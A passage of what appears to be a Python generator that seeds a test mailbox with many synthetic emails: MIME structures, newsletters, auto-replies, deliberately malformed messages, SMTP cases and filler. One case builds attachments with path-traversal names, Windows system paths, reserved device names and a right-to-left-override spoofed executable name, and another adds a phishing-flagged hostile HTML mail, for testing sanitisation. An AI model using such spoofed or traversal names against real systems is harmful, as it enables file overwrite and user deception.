                attachment(b"notes\n", "text/plain", "📎 Notizen.txt", style="2231"),
                attachment(b"japan\n", "text/plain", "議事録.txt", style="2047"),
                attachment(b"plain\n", "text/plain", "plain-ascii.txt"),
            ], self.bounds.next()))

        add("mime/hostile-filenames", "Attachment names that must be sanitised",
            multipart("mixed", [
                text_part("These file names must never be used unchanged on disk.\n"),
                attachment(b"#!/bin/sh\necho owned\n", "application/octet-stream", "../../../evil.sh"),
                attachment(b"@echo off\n", "application/octet-stream", "C:\\Windows\\System32\\evil.bat"),
                attachment(b"con\n", "text/plain", "CON"),
                attachment(b"aux\n", "text/plain", "aux.txt"),
                attachment(b"MZ fake exe\n", "application/octet-stream", "invoice\u202efdp.exe", style="2231"),
                attachment(b"ctl\n", "text/plain", "tab\tand\x07bell.txt", style="2231"),
                attachment(b"dots\n", "text/plain", "trailing dots and spaces. . ."),
                attachment(b"long\n", "text/plain", "x" * 300 + ".txt"),
                attachment(b"none\n", "application/octet-stream", None),
            ], self.bounds.next()), flags=[])

        logo = png_image(rng, 32, 32)
        html = (f"<html><body><p>Inline logo below:</p><p><img src=\"cid:logo@seed\" alt=\"logo\" "
                f"width=\"32\" height=\"32\"></p><p>{escape_html(text)}</p></body></html>\n")
        related = multipart("related", [text_part(html, "html"),
                                        attachment(logo, "image/png", "logo.png", inline=True, cid="logo@seed")],
                            self.bounds.next(), params='; type="text/html"')
        add("mime/related-cid", "multipart/related with cid: image (Apple Mail structure)",
            multipart("mixed", [
                multipart("alternative", [text_part(text), related], self.bounds.next()),
                attachment(pdf_document(rng, "Beilage", 2000), "application/pdf", "beilage.pdf"),
            ], self.bounds.next()))

        add("mime/inline-image", "Inline image without Content-ID",
            multipart("mixed", [text_part("Photo below.\n"),
                                attachment(png_image(rng, 40, 30), "image/png", "photo.png", inline=True),
                                text_part("Text after the photo.\n")], self.bounds.next()))

        inner_headers = self.base_headers("mime/forwarded-inner", base - dt.timedelta(days=30),
                                          PEOPLE[1][:2], [PEOPLE[0][:2]], "Original message with attachment")
        inner = message(inner_headers, multipart("mixed", [
            text_part("Original text.\n"), attachment(png_image(rng, 8, 8), "image/png", "tiny.png")],
            self.bounds.next()), crlf=False)
        add("mime/forward-rfc822", "Fwd: Original message with attachment",
            multipart("mixed", [text_part("See the forwarded message.\n"),
                                Part([b"Content-Type: message/rfc822",
                                      b'Content-Disposition: attachment; filename="forwarded.eml"'], inner)],
                      self.bounds.next()))

        signed_inner = text_part("This message is signed (dummy signature).\n")
        add("mime/smime-signed", "S/MIME signed (dummy signature)",
            multipart("signed", [signed_inner,
                                 attachment(rng.randbytes(600), "application/pkcs7-signature", "smime.p7s")],
                      self.bounds.next(), params='; protocol="application/pkcs7-signature"; micalg=sha-256'))

        pgp = ("-----BEGIN PGP MESSAGE-----\n\n" + base64.b64encode(rng.randbytes(300)).decode()
               + "\n-----END PGP MESSAGE-----\n").encode()
        add("mime/pgp-encrypted", "PGP/MIME encrypted (dummy payload)",
            multipart("encrypted", [
                Part([b"Content-Type: application/pgp-encrypted"], b"Version: 1\n"),
                Part([b'Content-Type: application/octet-stream; name="encrypted.asc"'], pgp)],
                self.bounds.next(), params='; protocol="application/pgp-encrypted"'))

        invite = ics.replace(b"VERSION:2.0\r\n", b"VERSION:2.0\r\nMETHOD:REQUEST\r\n").replace(
            b"END:VEVENT", b"ORGANIZER;CN=Carol:mailto:carol@example.org\r\n"
                           b"ATTENDEE;RSVP=TRUE:mailto:alice@vicemail.test\r\nEND:VEVENT")
        add("mime/calendar-invite", "Invitation: Kick-off @ Wed 10 Jun 2026 09:00",
            multipart("alternative", [
                text_part("You are invited to the kick-off.\n"),
                Part([b"Content-Type: text/calendar; charset=utf-8; method=REQUEST",
                      b"Content-Transfer-Encoding: 7bit"], invite)], self.bounds.next()), flags=[])

        digest_parts = []
        for i in range(3):
            h = self.base_headers(f"mime/digest-{i}", base, PEOPLE[13][:2], [self.alice], f"Digest item {i + 1}")
            digest_parts.append(Part([], message(h, text_part(f"Digest item {i + 1}.\n"), crlf=False)))
        add("mime/digest", "Mailing list digest (multipart/digest)",
            multipart("digest", digest_parts, self.bounds.next()), who=LISTS[1][:2],
            extra=[("List-Id", LISTS[1][2])])

        many = [text_part("Twelve small attachments.\n")]
        many += [attachment(f"file {i}\n".encode(), "text/plain", f"file-{i:02d}.txt") for i in range(12)]
        add("mime/many-attachments", "12 attachments", multipart("mixed", many, self.bounds.next()))

        add("mime/reply-to", "Reply-To and Sender differ from From",
            text_part("Replies should go to the team address.\n"),
            extra=[("Reply-To", "Team <team@example.org>"), ("Sender", "Assistant <assistant@example.org>")])

        add("mime/bcc-sent", "Sent mail with Bcc header", text_part("Copy for the boss in Bcc.\n"),
            folder=SENT, who=self.alice, to=[PEOPLE[0][:2]], extra=[("Bcc", address(*PEOPLE[1][:2]))])

        add("mime/many-recipients", "Message to 40 recipients",
            text_part("Large recipient list.\n"),
            to=[self.alice] + [(f"Person {i}", f"person{i}@example.com") for i in range(39)])

        add("mime/draft", "Unfinished draft", text_part("Dear team,\n\nI wanted to say\n"),
            folder=DRAFTS, who=self.alice, to=[PEOPLE[1][:2]], flags=["\\Draft", "\\Seen"])

        add("mime/keywords", "Message with many keywords", text_part("Keyword test.\n"),
            flags=["\\Seen", "\\Flagged", "$label1", "$label2", "$label3", "$label4", "$label5",
                   "$Forwarded", "$MDNSent", "projekt-x", "Steuer2026", "$NotJunk"])

        add("mime/review-folder", "Bitte prüfen: Vertrag", text_part("Bitte bis Freitag prüfen.\n"),
            folder=REVIEW, who=PEOPLE[15][:2], flags=["projekt-x"])

    def html_mails(self) -> None:
        host = self.image_host
        base = dt.datetime(2026, 7, 1, 7, 30, tzinfo=dt.timezone.utc)
        for i in range(4):
            key = f"html/newsletter-{i}"
            name, addr, list_id = LISTS[i % 2 if i < 3 else 2]
            date = base + dt.timedelta(days=7 * i)
            html = newsletter_html(host, key, f"Newsletter #{i + 1}")
            text = f"Newsletter #{i + 1}\n\nView online: https://news.example/{i}\nUnsubscribe: https://news.example/u\n"
            headers = self.base_headers(key, date, (name, addr), [self.alice], f"{name}: issue #{i + 1}", extra=[
                ("List-Id", list_id),
                ("List-Unsubscribe", f"<mailto:unsubscribe@{addr.split('@')[1]}?subject=unsubscribe>, "
                                     f"<https://{addr.split('@')[1]}/unsubscribe?u=alice&i={i}>"),
                ("List-Unsubscribe-Post", "List-Unsubscribe=One-Click"),
                ("Precedence", "bulk"),
            ])
            body = multipart("alternative", [text_part(text), text_part(html, "html", cte="quoted-printable")],
                             self.bounds.next())
            self.add("alice", INBOX, date, message(headers, body), key, ["\\Seen"] if i < 2 else [])

        key = "html/external-everything"
        date = base + dt.timedelta(days=30)
        html = external_showcase_html(host, key)
        headers = self.base_headers(key, date, SERVICES[0], [self.alice], "Every kind of external reference")
        self.add("alice", INBOX, date, message(headers, text_part(html, "html", cte="quoted-printable")), key)

        key = "html/hostile"
        date = base + dt.timedelta(days=31)
        headers = self.base_headers(key, date, SERVICES[4], [self.alice],
                                    "Your account will be suspended – verify now")
        self.add("alice", INBOX, date, message(headers, text_part(hostile_html(host, key), "html",
                                                                  cte="quoted-printable")), key,
                 ["$Phishing"])

        key = "html/broken-markup"
        date = base + dt.timedelta(days=32)
        html = ("<html><body><table><tr><td><p>Unclosed <b>bold <i>italic</table></div></span>"
                "<p>After broken table<img src=\"" + host + "img/" + key + "/unclosed.png\"" + " x" * 2000
                + "\n<a href='https://example.com/a?x=1&y=2'>link</a>\n")
        headers = self.base_headers(key, date, SERVICES[1], [self.alice], "Broken HTML markup")
        self.add("alice", INBOX, date, message(headers, text_part(html, "html", cte="quoted-printable")),
                 key, ["\\Seen"])

    def list_and_auto(self) -> None:
        base = dt.datetime(2026, 8, 3, 6, 0, tzinfo=dt.timezone.utc)
        cases = [
            ("auto/out-of-office", PEOPLE[3][:2], "Abwesenheitsnotiz: Projekt Phönix",
             [("Auto-Submitted", "auto-replied"), ("X-Auto-Response-Suppress", "All"),
              ("Precedence", "auto_reply")], "Ich bin bis 15. August nicht im Büro.\n"),
            ("auto/ci-failed", SERVICES[1], "[ci] Build #4711 failed on main",
             [("Auto-Submitted", "auto-generated"), ("Precedence", "bulk"), ("X-Mailer", "ci.example")],
             "Build #4711 failed.\nhttps://ci.example/builds/4711\n"),
            ("auto/order-shipped", SERVICES[0], "Your order #20260803 has shipped",
             [("Auto-Submitted", "auto-generated")], "Your parcel is on its way.\n"),
            ("auto/delivery-status", ("Mail Delivery System", "MAILER-DAEMON@example.net"),
             "Undelivered Mail Returned to Sender", [("Auto-Submitted", "auto-replied")],
             "This is the mail system. Your message could not be delivered.\n"),
            ("list/rust-users", LISTS[1][:2], "[rust-users] Async traits are stable now",
             [("List-Id", LISTS[1][2]), ("List-Post", "<mailto:rust-users@lists.example>"),
              ("List-Archive", "<https://lists.example/archive/rust-users>"),
              ("List-Unsubscribe", "<mailto:rust-users-leave@lists.example>"), ("Precedence", "list")],
             "Discussion thread.\n"),
            ("list/verein", LISTS[2][:2], "Einladung zur Mitgliederversammlung",
             [("List-Id", LISTS[2][2]), ("List-Unsubscribe", "<https://verein.example/abmelden>"),
              ("Precedence", "bulk")], "Liebe Mitglieder,\n\nhiermit laden wir ein.\n"),
            ("list/junk-precedence", ("Deals", "deals@shop.example"), "50% off everything!!!",
             [("Precedence", "junk")], "Buy now.\n"),
        ]
        for i, (key, sender, subject, extra, text) in enumerate(cases):
            date = base + dt.timedelta(hours=9 * i)
            folder = JUNK if key == "list/junk-precedence" else INBOX
            flags = ["$Junk"] if folder == JUNK else ["\\Seen"]
            headers = self.base_headers(key, date, sender, [self.alice], subject, extra=extra)
            self.add("alice", folder, date, message(headers, text_part(text)), key, flags)

    def broken(self) -> None:
        """Deliberately malformed messages. A robust client must show something sensible."""
        rng = self.rng
        base = dt.datetime(2026, 9, 1, 12, 0, tzinfo=dt.timezone.utc)
        alice = address(*self.alice)
        n = iter(range(100))

        def add(name: str, raw: bytes, folder: str = INBOX, date: dt.datetime | None = None) -> None:
            self.add("alice", folder, date or base + dt.timedelta(hours=3 * next(n)), raw, f"broken/{name}")

        def hdrs(name: str, subject: str, date_value: str | None = "auto") -> bytes:
            key = f"broken/{name}"
            date = base + dt.timedelta(hours=3 * next(n), minutes=1)
            lines = []
            if date_value == "auto":
                lines.append(f"Date: {fmt_date(date)}")
            elif date_value is not None:
                lines.append(f"Date: {date_value}")
            lines += [f"From: {address(*PEOPLE[1][:2])}", f"To: {alice}", f"Subject: {subject}",
                      f"Message-ID: {self.msgid(key)}", f"X-Vicemail-Seed: {key}", "MIME-Version: 1.0"]
            return ("\r\n".join(lines) + "\r\n").encode()

        def crlf(data: bytes) -> bytes:
            return data.replace(b"\r\n", b"\n").replace(b"\n", b"\r\n")

        add("wrong-boundary", hdrs("wrong-boundary", "Declared boundary does not match") + crlf(
            b'Content-Type: multipart/mixed; boundary="declared"\n\n--actual\nContent-Type: text/plain\n\n'
            b"Body under the wrong boundary.\n--actual--\n"))
        add("missing-final-boundary", hdrs("missing-final-boundary", "No closing boundary") + crlf(
            b'Content-Type: multipart/mixed; boundary="b1"\n\n--b1\nContent-Type: text/plain\n\nFirst part.\n'
            b"--b1\nContent-Type: text/plain\n\nSecond part, never closed.\n"))
        good = b64_body(pdf_document(rng, "cut", 3000))
        add("truncated-base64", hdrs("truncated-base64", "Attachment base64 cut off") + crlf(
            b'Content-Type: multipart/mixed; boundary="b2"\n\n--b2\nContent-Type: text/plain\n\nSee attachment.\n'
            b'--b2\nContent-Type: application/pdf; name="cut.pdf"\nContent-Transfer-Encoding: base64\n'
            b'Content-Disposition: attachment; filename="cut.pdf"\n\n' + good[: len(good) // 2 - 3] + b"\n--b2--\n"))
        add("invalid-base64", hdrs("invalid-base64", "Invalid characters in base64") + crlf(
            b"Content-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: base64\n\n"
            b"SGVsbG8g!!! V29y bGQ=\n====\n@@@\n"))
        add("unknown-charset", hdrs("unknown-charset", "Unknown charset x-made-up") + crlf(
            b"Content-Type: text/plain; charset=x-made-up-charset\nContent-Transfer-Encoding: 8bit\n\n"
            + "Unknown charset with bytes: Grüße \xa4 \xff\n".encode("latin-1")))
        add("mislabeled-charset", hdrs("mislabeled-charset", "Declared UTF-8, actually Latin-1") + crlf(
            b"Content-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: 8bit\n\n"
            + "Grüße aus Köln, schöne Straße.\n".encode("latin-1")))
        add("8bit-headers", crlf(
            "Date: Tue, 01 Sep 2026 15:00:00 +0200\nFrom: J\xfcrgen Gro\xdf <juergen.gross@firma.example>\n"
            f"To: {alice}\nSubject: Unencoded Latin-1 in header: \xc4rger mit der Stra\xdfe\n"
            f"Message-ID: {self.msgid('broken/8bit-headers')}\nX-Vicemail-Seed: broken/8bit-headers\n"
            "Content-Type: text/plain; charset=iso-8859-1\n\nBody in Latin-1: \xe4\xf6\xfc\n".encode("latin-1")))
        add("bad-date", hdrs("bad-date", "Impossible date", "Mon, 32 Foo 2026 25:61:99 +9999")
            + crlf(b"Content-Type: text/plain\n\nThe Date header is garbage.\n"))
        add("missing-date", hdrs("missing-date", "No Date header", None)
            + crlf(b"Content-Type: text/plain\n\nThere is no Date header.\n"))
        add("two-digit-year", hdrs("two-digit-year", "Obsolete date format", "1 Sep 26 12:00 EST")
            + crlf(b"Content-Type: text/plain\n\nRFC 822 style date.\n"))
        add("missing-headers", crlf(b"X-Vicemail-Seed: broken/missing-headers\n\n"
                                    b"No From, To, Subject, Date, Message-ID or MIME headers.\n"))
        add("headers-only", crlf(b"From: nobody@example.com\nSubject: Headers only, no body\n"
                                 b"X-Vicemail-Seed: broken/headers-only\n"))
        add("bad-encoded-words", hdrs("bad-encoded-words",
                                      "=?utf-8?Q?unterminated =?unknown-cs?B?Zm9v?= =?utf-8?B?not*base64?= "
                                      "=?utf-8?b?8J+R?= =?utf-8?b?u+KAiw==?= (split emoji)")
            + crlf(b"Content-Type: text/plain\n\nBroken RFC 2047 words in Subject.\n"))
        add("long-lines", hdrs("long-lines", "Very long header and body lines").replace(
            b"X-Vicemail-Seed", b"X-Long: " + b"a" * 2000 + b"\r\nX-Vicemail-Seed")
            + crlf(b"Content-Type: text/plain\n\n" + b"word " * 4000 + b"\n"))
        add("no-boundary-param", hdrs("no-boundary-param", "multipart without boundary") + crlf(
            b"Content-Type: multipart/mixed\n\n--x\nContent-Type: text/plain\n\ntext\n--x--\n"))
        nested = b"Content-Type: text/plain\n\nDeepest part.\n"
        for depth in range(40):
            b = f"d{depth}".encode()
            nested = (b'Content-Type: multipart/mixed; boundary="' + b + b'"\n\n--' + b + b"\n"
                      + nested + b"\n--" + b + b"--\n")
        add("deep-nesting", hdrs("deep-nesting", "40 levels of nested multipart") + crlf(nested))
        add("unknown-cte", hdrs("unknown-cte", "Unknown Content-Transfer-Encoding") + crlf(
            b"Content-Type: text/plain\nContent-Transfer-Encoding: x-gzip64\n\nH4sIAAAAAAAAA8tIzcnJBwCGphA2BQAAAA==\n"))
        add("invalid-qp", hdrs("invalid-qp", "Invalid quoted-printable") + crlf(
            b"Content-Type: text/plain; charset=utf-8\nContent-Transfer-Encoding: quoted-printable\n\n"
            b"Bad escapes =ZZ =4 =C3=\nsoft break at the very end=\n"))
        add("binary-garbage", crlf(b"From: garbage@example.com\nSubject: Binary garbage without Content-Type\n"
                                   b"X-Vicemail-Seed: broken/binary-garbage\n\n")
            + bytes(b for b in rng.randbytes(2000) if b not in (0, 10, 13)) + b"\r\n")
        add("duplicate-headers", hdrs("duplicate-headers", "First subject").replace(
            b"Subject: First subject\r\n", b"Subject: First subject\r\nSubject: Second subject\r\n"
                                           b"From: second-from@example.com\r\nDate: Wed, 02 Sep 2026 10:00:00 +0000\r\n")
            + crlf(b"Content-Type: text/plain\n\nTwo Subject, From and Date headers.\n"))
        add("bare-lf", (hdrs("bare-lf", "Bare LF line endings") + b"Content-Type: text/plain\r\n\r\n").replace(
            b"\r\n", b"\n") + b"Line one\nLine two\n")
        add("truncated-rfc822", hdrs("truncated-rfc822", "Truncated message/rfc822 part") + crlf(
            b'Content-Type: multipart/mixed; boundary="b3"\n\n--b3\nContent-Type: text/plain\n\nForwarded:\n'
            b"--b3\nContent-Type: message/rfc822\n\nFrom: inner@example.com\nSubject: inner\nContent-Type: "
            b'multipart/alternative; boundary="inner"\n\n--inner\nContent-Type: text/plain\n\ncut here'))
        add("bad-addresses", crlf(
            b"Date: Wed, 02 Sep 2026 11:00:00 +0000\nFrom: Alice <alice@>\n"
            b'To: ;;;, <@>, "unterminated <x@example.com>, undisclosed-recipients:;\n'
            b"Cc: @@@, plainword\nSubject: Broken address lists\nMessage-ID: no-angle-brackets@seed\n"
            b"X-Vicemail-Seed: broken/bad-addresses\n\nAddress syntax is wrong everywhere.\n"))
        dup_id = self.msgid("thread/offsite-03")
        add("duplicate-message-id", hdrs("duplicate-message-id", "Same Message-ID as thread message 3").replace(
            self.msgid("broken/duplicate-message-id").encode(), dup_id.encode())
            + crlf(b"Content-Type: text/plain\n\nDuplicate Message-ID in another folder.\n"), folder=PROJECTS)
        add("reference-loop", hdrs("reference-loop", "Re: References itself").replace(
            b"X-Vicemail-Seed", b"In-Reply-To: " + self.msgid("broken/reference-loop").encode()
            + b"\r\nReferences: <missing-parent@nowhere.example> " + self.msgid("broken/reference-loop").encode()
            + b"\r\nX-Vicemail-Seed") + crlf(b"Content-Type: text/plain\n\nReferences point to itself.\n"))
        add("charset-in-filename", hdrs("charset-in-filename", "Attachment name in raw UTF-8") + crlf(
            b'Content-Type: multipart/mixed; boundary="b4"\n\n--b4\nContent-Type: text/plain\n\nRaw name.\n'
            b'--b4\nContent-Type: application/octet-stream; name="' + "Größe ✓.bin".encode() + b'"\n'
            b'Content-Disposition: attachment; filename="' + "Größe ✓.bin".encode() + b'"\n'
            b"Content-Transfer-Encoding: base64\n\nAAEC\n--b4--\n"))

    def large(self) -> None:
        rng = self.rng
        for i, (size, kind) in enumerate([(1_500_000, "pdf"), (5_000_000, "zip")]):
            key = f"large/{kind}-{size // 1_000_000 or 1}mb"
            date = dt.datetime(2026, 10, 1 + i, 9, 0, tzinfo=dt.timezone.utc)
            if kind == "pdf":
                data = pdf_document(rng, "Large document", size * 3 // 4)
                att = attachment(data, "application/pdf", "large-document.pdf")
            else:
                data = zip_archive({"random.bin": rng.randbytes(size)})
                att = attachment(data, "application/zip", "large-archive.zip")
            headers = self.base_headers(key, date, PEOPLE[1][:2], [self.alice], f"Large attachment ({kind})")
            self.add("alice", ARCHIVE if i else INBOX, date,
                     message(headers, multipart("mixed", [text_part("Large attachment.\n"), att],
                                                self.bounds.next())), key, ["\\Seen"])

    def smtp_corpus(self) -> None:
        """Messages delivered through SMTP after the APPEND phase."""
        base = dt.datetime(2026, 11, 20, 9, 0, tzinfo=dt.timezone(dt.timedelta(hours=1)))
        bob, alice = self.bob, self.alice

        def mk(key: str, minutes: int, sender, to, subject, body: Part, extra=(), cc=()) -> Msg:
            date = base + dt.timedelta(minutes=minutes)
            headers = self.base_headers(key, date, sender, to, subject, cc=list(cc), extra=list(extra))
            return Msg("", INBOX, date, message(headers, body), key)

        m1 = mk("smtp/bob-1", 0, bob, [alice], "SMTP test 1: submission with STARTTLS",
                text_part("Sent by bob through port 1587 with STARTTLS and AUTH.\n"))
        m2 = mk("smtp/bob-2", 5, bob, [alice], "SMTP test 2: attachment, Cc to bob",
                multipart("mixed", [text_part("With an attachment.\n"),
                                    attachment(png_image(self.rng, 16, 16), "image/png", "smtp.png")],
                          self.bounds.next()), cc=[bob])
        m3 = mk("smtp/bob-3", 10, bob, [alice], "Re: SMTP test 1: submission with STARTTLS",
                text_part("Reply sent through port 1465 (implicit TLS).\n"),
                extra=[("In-Reply-To", self.msgid("smtp/bob-1")), ("References", self.msgid("smtp/bob-1"))])
        m4 = mk("smtp/bob-4", 15, bob, [alice], "SMTP-Test 4: Grüße mit 8-Bit-Text ✓",
                text_part("8-Bit-Text über SMTP: Grüße, Straße, ✓.\n", cte="8bit"))
        m5 = mk("smtp/external-1", 20, LISTS[0][:2], [alice], "Example News: delivered by SMTP without AUTH",
                multipart("alternative", [
                    text_part("Newsletter via the local SMTP port.\n"),
                    text_part(newsletter_html(self.image_host, "smtp/external-1", "SMTP newsletter"), "html",
                              cte="quoted-printable")], self.bounds.next()),
                extra=[("List-Id", LISTS[0][2]), ("List-Unsubscribe", "<https://news.example/unsubscribe>")])
        a1 = mk("smtp/alice-1", 30, alice, [bob], "Hello Bob from Alice",
                text_part("Sent by alice through port 1587.\n"))
        a2 = mk("smtp/alice-2", 35, alice, [bob], "Re: SMTP test 2: attachment, Cc to bob",
                text_part("Got it, thanks.\n"),
                extra=[("In-Reply-To", self.msgid("smtp/bob-2")), ("References", self.msgid("smtp/bob-2"))])
        b, a = self.bob[1], self.alice[1]
        self.smtp_msgs = [
            ("submission", b, [a], m1), ("submission", b, [a, b], m2), ("smtps", b, [a], m3),
            ("submission", b, [a], m4), ("smtp", LISTS[0][1], [a], m5),
            ("submission", a, [b], a1), ("submission", a, [b], a2),
        ]
        # Sent copies, as a mail client would store them.
        for sent in (a1, a2):
            self.add("alice", SENT, sent.date, sent.raw, sent.key, ["\\Seen"])
        for sent in (m1, m2, m3, m4):
            self.add("bob", SENT, sent.date, sent.raw, sent.key, ["\\Seen"])

    def bob_corpus(self) -> None:
        base = dt.datetime(2026, 10, 1, 8, 0, tzinfo=dt.timezone.utc)
        for i in range(16):
            key = f"bob/inbox-{i:02d}"
            person = PEOPLE[i % len(PEOPLE)]
            lang = person[2] if person[2] in ("en", "de") else "en"
            date = base + dt.timedelta(hours=11 * i)
            headers = self.base_headers(key, date, person[:2], [self.bob], self.subject_for(lang))
            text = self.body_text(lang, "Bob", person[0] or "Anonymous")
            body = text_part(text) if i % 3 else multipart(
                "alternative", [text_part(text), text_part(self.html_from_text(text), "html")], self.bounds.next())
            self.add("bob", INBOX, date, message(headers, body), key, ["\\Seen"] if i < 10 else [])

    def filler(self, count: int) -> None:
        rng = self.rng
        start = dt.datetime(2023, 1, 1, tzinfo=dt.timezone.utc).timestamp()
        end = dt.datetime(2026, 11, 15, tzinfo=dt.timezone.utc).timestamp()
        stamps = sorted(rng.uniform(start, end) for _ in range(count))
        folders = [f for f, _ in FILLER_FOLDERS]
        weights = [w for _, w in FILLER_FOLDERS]
        kinds = ["plain", "alternative", "attachment", "related", "newsletter", "notification",
                 "charset", "reply"]
        kind_weights = [30, 25, 12, 4, 10, 8, 6, 5]
        zones = [0, 1, 2, -5, -8, 9, 5.5]
        recent: list[tuple[str, str, tuple[str, str], dt.datetime]] = []  # (msgid, subject, sender, date)
        for i, stamp in enumerate(stamps):
            key = f"filler/{i:05d}"
            tz = dt.timezone(dt.timedelta(hours=rng.choice(zones)))
            date = dt.datetime.fromtimestamp(int(stamp), tz)
            folder = rng.choices(folders, weights)[0]
            if self.filler_folder:
                folder = self.filler_folder
            kind = rng.choices(kinds, kind_weights)[0]
            person = rng.choice(PEOPLE)
            lang = person[2] if person[2] in ("en", "de") else rng.choice(["en", "de"])
            outgoing = folder in (SENT, DRAFTS)
            sender = self.alice if outgoing else person[:2]
            to = [person[:2] if person[1] else PEOPLE[0][:2]] if outgoing else [self.alice]
            subject = self.subject_for(lang)
            extra: list[tuple[str, str]] = []
            text = self.body_text(lang, to[0][0], sender[0] or "N.N.")

            if kind == "reply" and recent:
                parent_id, parent_subject, parent_sender, parent_date = rng.choice(recent[-30:])
                subject = parent_subject if parent_subject.lower().startswith(("re:", "aw:")) else "Re: " + parent_subject
                extra += [("In-Reply-To", parent_id), ("References", parent_id)]
                quoted = "\n".join("> " + s for s in self.sentences(lang, 2))
                intro = (f"Am {fmt_date(parent_date)} schrieb {parent_sender[0]}:" if lang == "de"
                         else f"On {fmt_date(parent_date)}, {parent_sender[0]} wrote:")
                text += f"\n{intro}\n{quoted}\n"
                body = text_part(text)
            elif kind == "alternative":
                body = multipart("alternative", [text_part(text), text_part(self.html_from_text(text, subject), "html")],
                                 self.bounds.next())
            elif kind == "attachment":
                body = multipart("mixed", [text_part(text)] + [self.random_attachment(i, j)
                                                              for j in range(rng.randint(1, 3))], self.bounds.next())
            elif kind == "related":
                html = (f"<html><body><img src=\"cid:img{i}@seed\" alt=\"\"><div>{escape_html(text)}</div>"
                        f"</body></html>\n")
                body = multipart("related", [text_part(html, "html"),
                                             attachment(png_image(rng, 24, 24), "image/png", "image.png",
                                                        inline=True, cid=f"img{i}@seed")],
                                 self.bounds.next(), params='; type="text/html"')
            elif kind == "newsletter" and not outgoing:
                name, addr, list_id = rng.choice(LISTS)
                sender = (name, addr)
                subject = f"{name}: {self.subject_for('en')}"
                html = newsletter_html(self.image_host, key, subject)
                extra += [("List-Id", list_id), ("List-Unsubscribe", f"<https://{addr.split('@')[1]}/u/{i}>"),
                          ("Precedence", "bulk")]
                body = multipart("alternative", [text_part(f"{subject}\n\nhttps://news.example/{i}\n"),
                                                 text_part(html, "html", cte="quoted-printable")], self.bounds.next())
            elif kind == "notification" and not outgoing:
                sender = rng.choice(SERVICES)
                subject = f"Notification {rng.randint(1000, 9999)}: {rng.choice(EN_TOPICS)}"
                extra += [("Auto-Submitted", "auto-generated")]
                body = text_part(f"Automated notification about {rng.choice(EN_TOPICS)}.\n")
            elif kind == "charset" and not outgoing:
                lang = rng.choice(["fr", "ru", "ja"])
                charset = {"fr": "iso-8859-1", "ru": "koi8-r", "ja": "iso-2022-jp"}[lang]
                sender = {"fr": PEOPLE[4], "ru": PEOPLE[7], "ja": PEOPLE[8]}[lang][:2]
                text = self.body_text(lang, "Alice", sender[0])
                subject = " ".join(self.sentences(lang, 1))
                body = text_part(text, charset=charset,
                                 cte="7bit" if charset == "iso-2022-jp" else "quoted-printable")
                headers = self.base_headers(key, date, sender, to, "x", extra=extra)
                headers[[h[0] for h in headers].index("Subject")] = ("Subject", encoded_words(subject, charset))
                self.finish_filler(key, folder, date, headers, body, recent, subject, sender, i)
                continue
            else:
                body = text_part(text, cte=rng.choice(["7bit", "quoted-printable", "8bit"]))

            headers = self.base_headers(key, date, sender, to, subject, extra=extra)
            self.finish_filler(key, folder, date, headers, body, recent, subject, sender, i)

    def finish_filler(self, key, folder, date, headers, body, recent, subject, sender, i) -> None:
        rng = self.rng
        flags: list[str] = []
        old = date < dt.datetime(2026, 9, 1, tzinfo=dt.timezone.utc)
        if folder in (SENT, ARCHIVE, TRASH) or rng.random() < (0.9 if old else 0.4):
            flags.append("\\Seen")
        if folder == DRAFTS:
            flags += ["\\Draft", "\\Seen"]
        if rng.random() < 0.04:
            flags.append("\\Flagged")
        if rng.random() < 0.08 and folder == INBOX:
            flags.append("\\Answered")
        for keyword, p in (("$label1", 0.03), ("$label2", 0.02), ("$Forwarded", 0.03), ("$MDNSent", 0.01)):
            if rng.random() < p:
                flags.append(keyword)
        if folder in (PROJECTS, REVIEW) and rng.random() < 0.5:
            flags.append("projekt-x")
        if folder == JUNK:
            flags.append("$Junk")
        msgid = self.msgid(key)
        recent.append((msgid, subject, sender, date))
        if len(recent) > 60:
            recent.pop(0)
        self.add("alice", folder, date, message(headers, body), key, sorted(set(flags), key=flags.index))

    def random_attachment(self, i: int, j: int) -> Part:
        rng = self.rng
        kind = rng.choice(["pdf", "png", "csv", "txt", "zip", "bin", "ics"])
        name_base = rng.choice(["Rechnung", "report", "Übersicht", "notes", "Protokoll", "scan", "Angebot"])
        style = rng.choice(["plain", "2231", "2047"])
        if kind == "pdf":
            return attachment(pdf_document(rng, name_base, rng.randint(1000, 30000)), "application/pdf",
                              f"{name_base}-{i}.pdf", style=style)
        if kind == "png":
            return attachment(png_image(rng, rng.randint(8, 96), rng.randint(8, 96)), "image/png",
                              f"{name_base}-{i}.png", style=style)
        if kind == "csv":
            rows = "\n".join(f"{k};{rng.randint(1, 9999)};{rng.choice(['EUR', 'USD', 'CHF'])}" for k in range(40))
            return attachment(rows.encode(), "text/csv", f"{name_base}-{i}.csv", style=style)
        if kind == "txt":
            return attachment(" ".join(self.sentences("en", 20)).encode(), "text/plain; charset=utf-8",
                              f"{name_base}-{i}.txt", style=style)
        if kind == "zip":
            return attachment(zip_archive({f"{name_base}.txt": rng.randbytes(rng.randint(100, 8000))}),
                              "application/zip", f"{name_base}-{i}.zip", style=style)
        if kind == "ics":
            ics = (f"BEGIN:VCALENDAR\r\nVERSION:2.0\r\nPRODID:-//Vice Mail//seed//EN\r\nBEGIN:VEVENT\r\n"
                   f"UID:filler-{i}-{j}@vicemail.test\r\nDTSTAMP:20260101T000000Z\r\n"
                   f"DTSTART:20260101T090000Z\r\nSUMMARY:{name_base}\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n")
            return attachment(ics.encode(), "text/calendar", f"{name_base}-{i}.ics", style=style)
        return attachment(rng.randbytes(rng.randint(500, 20000)), "application/octet-stream",
                          f"{name_base}-{i}.bin", style=style)


def escape_html(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")


def fmt_date(date: dt.datetime) -> str:
    from email.utils import format_datetime
    return format_datetime(date)


def imap_date(date: dt.datetime) -> str:
    months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
    offset = date.utcoffset() or dt.timedelta(0)
    minutes = int(offset.total_seconds() // 60)
    sign = "+" if minutes >= 0 else "-"
    minutes = abs(minutes)
    return (f"{date.day:02d}-{months[date.month - 1]}-{date.year} {date:%H:%M:%S} "
            f"{sign}{minutes // 60:02d}{minutes % 60:02d}")


def newsletter_html(host: str, key: str, title: str) -> str:
    tag = key.replace("/", "-")
    return f"""<!DOCTYPE html>
